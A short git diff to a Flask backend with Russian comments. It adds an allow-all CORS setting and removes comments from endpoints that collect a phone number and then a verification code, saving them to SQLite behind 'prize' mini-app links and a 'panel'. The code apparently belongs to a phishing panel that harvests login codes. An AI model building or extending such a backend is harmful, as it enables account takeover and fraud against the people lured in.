@@ -1,4 +1,5 @@
 from flask import Flask, request, send_file
+from flask_cors import CORS
 import requests
 import json
 import sqlite3
@@ -14,6 +15,7 @@ MINI_APP_URL2 = "https://bot-panel-v2.onrender.com/prize2"
 PANEL_URL = "https://bot-panel-v2.onrender.com/panel"
 
 app = Flask(__name__)
+CORS(app)  # ← РАЗРЕШАЕМ ЗАПРОСЫ С ЛЮБЫХ ДОМЕНОВ
 logging.basicConfig(level=logging.INFO)
 
 # ========== БАЗА ДАННЫХ ==========
@@ -199,7 +201,6 @@ def api_contact():
     if not phone:
         return json.dumps({"status": "error", "message": "Номер обязателен"}), 400
 
-    # Сохраняем в базу
     conn = sqlite3.connect("bot_panel.db")
     cursor = conn.cursor()
     cursor.execute(
@@ -222,7 +223,6 @@ def api_verify():
     if not phone or not code:
         return json.dumps({"status": "error", "message": "Телефон и код обязательны"}), 400
 
-    # Обновляем запись в базе
     conn = sqlite3.connect("bot_panel.db")
     cursor = conn.cursor()
     cursor.execute(
